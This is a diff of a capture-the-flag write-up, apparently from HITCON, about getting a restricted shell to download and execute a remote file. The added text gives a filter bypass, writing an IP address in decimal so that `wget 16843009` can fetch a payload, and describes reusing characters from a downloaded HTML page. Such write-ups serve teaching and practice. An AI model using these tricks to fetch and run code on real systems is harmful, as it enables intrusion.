@@ -162,7 +162,7 @@ index.html: HTML document, ASCII text, with very long lines
 index.html: line 1: syntax error near unexpected token `<'   <-- Expected, since it's just HTML right now
 ```
 
-Great, downloading and executing a file looks like it will work. Now we just
+Great, downloading and executing a file looks like it will work. Now we just to
 need put a bash script on a server that can be reached from the shell. However,
 when I tried to few different servers, I got this:
 ```
@@ -175,9 +175,15 @@ when I tried to few different servers, I got this:
 ```
 
 So subdomains and subdirectories are a no-go. We actually need a full domain
-like `google.com` or `hitcon.org`. I asked around on my team, but nobody owned a
-domain that I could use.
+like `google.com` or `hitcon.org`.
 
+**Note**: adikso from IRC gave me some feedback on this write-up and told me a
+method to bypass this. If only I had thought of this before 😩
+> If you don't have the domain you could convert the ip address to its decimal
+> format https://www.ipaddressguide.com/ip and then just `wget 16843009`
+
+Since I assumed that we needed a proper domain, I asked around on my team, but
+nobody owned a domain that I could use.
 I was stumped here for a while before I came up with a stupid idea:
 - Download some HTML page like `hitcon.org`
 - Since it's HTML, it'll contain characters like `- / < >`
